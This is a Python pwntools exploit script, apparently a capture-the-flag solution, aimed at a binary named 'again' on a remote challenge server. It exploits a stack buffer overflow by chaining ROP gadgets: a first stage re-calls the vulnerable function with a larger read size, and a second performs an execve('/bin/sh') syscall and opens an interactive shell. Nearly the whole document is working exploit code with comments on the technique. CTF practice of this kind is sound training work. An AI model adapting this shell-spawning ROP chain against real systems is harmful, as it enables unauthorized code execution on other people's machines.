from pwn import *

def main():
  trfghy  = 0x4009ae
  poprdi  = 0x401526  # pop rdi ; ret
  poprsx  = 0x442ae9  # pop rdx ; pop rsi ; ret
  poprax  = 0x4787f6  # pop rax ; pop rdx ; pop rbx ; ret
  syscall = 0x467495  # syscall ; ret
  binsh   = 0x4a1341

  # The binary is 64-bit and statically linked with NX and ASLR.
  # We have an obvious buffer overflow in the `trfghy` function.

  # We only have 24 bytes to play with at first, but we can get
  # more by calling trfghy again, with a larger argument.
  # Arguments are passed using a pop rdi gadget.

  # Once we re-call `trfghy`, we can build a ROP chain to make
  # an execve syscall.
  # 59 --> rax (syscall number)
  # /bin/sh --> rdi (argument #1)
  # NULL --> rsi (argument #2)
  # NULL --> rdx (argument #3)

  # because the `read` function will read in newlines as well
  # it's easiest to combine the two rop chains as one long
  # rop chain

  local = 0
  if local:
    p = process('./again')
  else:
    p = remote('lox.xvm.mit.edu', 24001)

  print p.recvuntil("144")
  # rop1 makes the trfghy(1000) call
  rop1 = "A" * 120 + p64(poprdi) + p64(1000) + p64(trfghy)

  # rop2 calls execve("/bin/sh", 0, 0)
  rop2 = "A" * 120 + p64(poprdi) + p64(binsh) \
                   + p64(poprax) + p64(59) + p64(0) + p64(0) \
                   + p64(poprsx) + p64(0) * 2 \
                   + p64(syscall)

  p.sendline(rop1 + rop2)
  p.interactive()

if __name__ == '__main__':
  main()
